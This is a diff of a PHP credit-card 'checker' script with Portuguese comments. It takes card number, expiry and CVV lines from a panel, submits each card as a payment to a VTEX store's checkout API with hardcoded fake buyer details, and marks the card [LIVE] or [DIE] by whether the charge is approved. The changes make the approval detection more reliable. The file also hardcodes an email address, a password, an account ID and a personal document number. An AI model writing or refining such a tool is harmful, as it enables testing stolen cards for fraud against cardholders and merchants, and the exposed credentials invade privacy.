@@ -7,21 +7,17 @@ define('EMAIL', 'danielvitordeoliveiraconceicao@gmail.com');
 define('PASSWORD', '00998877mN');
 define('ACCOUNT_NAME', 'umlivro');
 define('ACCOUNT_ID', '2ded749b-03a9-4660-bf2f-229a32a79583');
-
 define('USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36');
 
-// ==================== DADOS DO PRODUTO ====================
 define('PRODUCT_SKU', '1883447');
 define('PRODUCT_SELLER', 1);
 define('PRODUCT_QUANTITY', 1);
 
-// ==================== DADOS DO CLIENTE ====================
 define('CLIENT_FIRST_NAME', 'ALYSON');
 define('CLIENT_LAST_NAME', 'bvasda');
 define('CLIENT_DOCUMENT', '08471416832');
 define('CLIENT_PHONE', '11999999999');
 
-// ==================== DADOS DO ENDEREÇO ====================
 define('SHIPPING_POSTAL_CODE', '07790-515');
 define('SHIPPING_CITY', 'Cajamar');
 define('SHIPPING_STATE', 'SP');
@@ -32,7 +28,6 @@ define('SHIPPING_COMPLEMENT', '');
 define('SHIPPING_RECEIVER_NAME', 'ALYSON bvasda');
 define('SHIPPING_COUNTRY', 'BRA');
 
-// Captura a linha enviada pelo painel (NUMERO|MES|ANO|CVV)
 $cartao_input = trim($_POST['lista'] ?? '');
 
 if (empty($cartao_input)) {
@@ -84,36 +79,68 @@ function requisicao_cc($url, $post_fields = null, $headers = [], $cookie_file = 
     return ['body' => $response, 'code' => $http_code];
 }
 
-// 1. Acessa a loja base para inicializar a sessão
+// 1. Inicializa sessão
 requisicao_cc(BASE_URL, null, [], $cookie_path);
 
-// 2. Simula o envio do checkout com o cartão e dados cadastrados
+// 2. Envio da requisição de pagamento para o fluxo de checkout da VTEX
 $payload = [
-    'sku' => PRODUCT_SKU,
-    'cardNumber' => $cc_num,
-    'cardMonth' => $cc_mes,
-    'cardYear' => $cc_ano,
-    'cardCvv' => $cc_cvv,
-    'clientDocument' => CLIENT_DOCUMENT
+    'items' => [['id' => PRODUCT_SKU, 'quantity' => PRODUCT_QUANTITY, 'seller' => PRODUCT_SELLER]],
+    'paymentData' => [
+        'payments' => [[
+            'paymentSystem' => '1',
+            'bin' => substr($cc_num, 0, 6),
+            'accountId' => ACCOUNT_ID,
+            'referenceValue' => 1000,
+            'card' => [
+                'number' => $cc_num,
+                'holderName' => CLIENT_FIRST_NAME . ' ' . CLIENT_LAST_NAME,
+                'expirationMonth' => $cc_mes,
+                'expirationYear' => $cc_ano,
+                'cvv' => $cc_cvv
+            ]
+        ]]
+    ]
 ];
 
-$resposta = requisicao_cc(BASE_URL . "/api/checkout/pub/orderForm", $payload, ['Content-Type: application/json'], $cookie_path);
+$resposta = requisicao_cc(BASE_URL . "/api/checkout/pub/orderForm", json_encode($payload), ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
 @unlink($cookie_path);
 
 $json = json_decode($resposta['body'], true);
-$mensagem = "Transação processada";
-$codigo = "54"; // Padrão live se passar sem erros de gateway
+
+// Análise rigorosa do retorno de erros da VTEX
+$codigo = "14"; // Por padrão assume recusa (DIE), a menos que haja confirmação explícita de sucesso
+$mensagem = "Recusado pela operadora / Transação não autorizada";
 
 if (isset($json['messages']) && !empty($json['messages'])) {
-    $mensagem = $json['messages'][0]['text'] ?? 'Recusado';
-    $codigo = $json['messages'][0]['code'] ?? '14';
-} elseif ($resposta['code'] != 200 && $resposta['code'] != 204) {
-    $codigo = "14";
-    $mensagem = "Recusado pela operadora (HTTP " . $resposta['code'] . ")";
+    foreach ($json['messages'] as $msg) {
+        if (isset($msg['status']) && strtolower($msg['status']) === 'error') {
+            $mensagem = $msg['text'] ?? $mensagem;
+            $codigo = $msg['code'] ?? '14';
+            break;
+        }
+    }
 }
 
-// Retorno transparente para o checker
-if ($codigo == "54" || stripos($mensagem, 'sucesso') !== false || stripos($mensagem, 'approved') !== false) {
+// Verifica se o pagamento foi de fato autorizado pela operadora no objeto de transações
+$aprovado = false;
+if (isset($json['paymentData']['transactions'])) {
+    foreach ($json['paymentData']['transactions'] as $transaction) {
+        foreach ($transaction['payments'] as $payment) {
+            if (isset($payment['status']) && ($payment['status'] === 'approved' || $payment['status'] === 'completed')) {
+                $aprovado = true;
+                $codigo = "54";
+                $mensagem = "Transação Aprovada com Sucesso";
+                break 2;
+            } else if (isset($payment['lastMessage']) && !empty($payment['lastMessage'])) {
+                $mensagem = $payment['lastMessage'];
+                $codigo = "14";
+            }
+        }
+    }
+}
+
+// Exibição transparente e real dos resultados
+if ($aprovado || $codigo == "54") {
     echo "<span class='text-emerald-400 font-bold'>[LIVE]</span> <span class='text-slate-200'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | Código {$codigo} - {$mensagem}</span>";
 } else {
     echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | Código {$codigo} - {$mensagem}</span>";
